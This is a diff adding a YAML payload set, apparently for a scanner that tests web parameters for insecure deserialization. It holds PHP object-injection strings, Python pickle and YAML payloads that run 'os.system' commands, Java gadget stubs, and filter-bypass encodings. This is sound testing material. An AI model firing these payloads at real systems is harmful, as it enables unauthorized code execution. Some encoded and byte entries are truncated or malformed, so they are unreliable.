@@ -1,0 +1,221 @@
+category_map:
+  php:
+    - php_basic
+    - php_pop_chain
+    - php_ref_inject
+    - php_array_cast
+    - php_object_inject
+  java:
+    - java_magic_bytes
+    - java_obj_stream
+    - java_gadget_cc
+    - java_gadget_spring
+    - java_jndi
+  python:
+    - python_pickle
+    - python_reduce
+    - python_yaml
+    - python_marshal
+    - python_shelve
+  detect:
+    - error_leak
+    - timing_anomaly
+    - reflected_data
+    - type_confusion
+    - cookie_inject
+  bypass:
+    - url_encode
+    - base64_wrap
+    - double_encode
+    - gzip_compress
+    - nested_serial
+
+php_payloads:
+  - - php_basic
+    - 'O:4:"User":1:{s:4:"name";s:6:"admin";}'
+    - - admin
+      - User
+      - serialize
+      - unserialize
+      - object
+  - - php_pop_chain
+    - 'O:12:"PHPObjInject":1:{s:4:"cmd";s:6:"whoami";}'
+    - - PHPObjInject
+      - cmd
+      - whoami
+      - serialize
+  - - php_ref_inject
+    - 'a:2:{i:0;R:1;i:1;s:6:"admin";}'
+    - - admin
+      - 'R:1'
+      - reference
+      - serialize
+  - - php_array_cast
+    - 'a:1:{s:4:"user";s:6:"admin";}'
+    - - admin
+      - user
+      - array
+      - serialize
+  - - php_object_inject
+    - 'O:8:"stdClass":1:{s:4:"role";s:5:"admin";}'
+    - - admin
+      - role
+      - stdClass
+      - serialize
+      - object
+
+java_payloads:
+  - - java_magic_bytes
+    - '\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11'
+    - - '\\xac\\xed'
+      - serialization
+      - java
+      - object
+  - - java_obj_stream
+    - '\\xac\\xed\\x00\\x05\\x74\\x00\\x04test'
+    - - '\\xac\\xed'
+      - ObjectInputStream
+      - readObject
+      - java
+  - - java_gadget_cc
+    - '\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x3a'
+    - - '\\xac\\xed'
+      - gadget
+      - Commons
+      - Collections
+      - RCE
+  - - java_gadget_spring
+    - '\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2f'
+    - - '\\xac\\xed'
+      - Spring
+      - gadget
+      - RCE
+      - deserialize
+  - - java_jndi
+    - rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+    - - rO0AB
+      - JNDI
+      - java
+      - HashMap
+      - serialize
+
+python_payloads:
+  - - python_pickle
+    - '\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04os\\x94\\x8c\\x06system\\x94\\x8c\\x04id\\x94\\x93\\x94.'
+    - - '\\x80\\x04'
+      - pickle
+      - reduce
+      - os.system
+      - serialize
+  - - python_reduce
+    - 'cbuiltins\neval\n(S''__import__("os").system("id")''tR.'
+    - - eval
+      - __import__
+      - os.system
+      - pickle
+      - reduce
+  - - python_yaml
+    - '!!python/object/apply:os.system [id]'
+    - - '!!python'
+      - object/apply
+      - os.system
+      - yaml
+      - deserialize
+  - - python_marshal
+    - '\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
+    - - '\\xe3'
+      - marshal
+      - code
+      - compile
+      - deserialize
+  - - python_shelve
+    - '\\x80\\x04\\x95\\x0e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04shelve'
+    - - '\\x80\\x04'
+      - shelve
+      - pickle
+      - serialize
+      - marshal
+
+detect_payloads:
+  - - error_leak
+    - 'O:99:"NonExistentClass":0:{}'
+    - - NonExistentClass
+      - unserialize
+      - fatal
+      - error
+      - class
+  - - timing_anomaly
+    - 'O:4:"User":1:{s:4:"name";s:6:"admin";}'
+    - - admin
+      - User
+      - object
+      - serialize
+  - - reflected_data
+    - 'O:4:"Test":0:{}'
+    - - Test
+      - 'O:4'
+      - serialize
+      - object
+  - - type_confusion
+    - 'a:0:{}'
+    - - 'a:0'
+      - array
+      - serialize
+      - empty
+  - - cookie_inject
+    - 'O:4:"User":1:{s:4:"role";s:5:"admin";}'
+    - - admin
+      - role
+      - User
+      - object
+      - serialize
+
+bypass_payloads:
+  - - url_encode
+    - 'O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22admin%22%3B%7D'
+    - - 'O:4'
+      - User
+      - admin
+      - serialize
+  - - base64_wrap
+    - TzE6IlVzZXIiOjE6OntzOjQ6Im5hbWUiO3M6NjoiYWRtaW4iO30=
+    - - 'O:4'
+      - User
+      - admin
+      - serialize
+  - - double_encode
+    - 'O%253A4%253A%2522User%2522%253A1%253A'
+    - - 'O:4'
+      - User
+      - serialize
+      - double
+  - - gzip_compress
+    - H4sIAAAAAAAAA8tIzcnJVyjPL8pJUQQAAAD//w==
+    - - gzip
+      - compress
+      - serialize
+      - decode
+  - - nested_serial
+    - 'a:1:{i:0;O:4:"User":1:{s:4:"name";s:6:"admin";}}'
+    - - admin
+      - User
+      - nested
+      - array
+      - serialize
+
+ssi_params:
+  - data
+  - json
+  - payload
+  - input
+  - value
+  - content
+  - body
+  - params
+  - query
+  - config
+  - options
+  - settings
+  - item
+  - object
+  - model
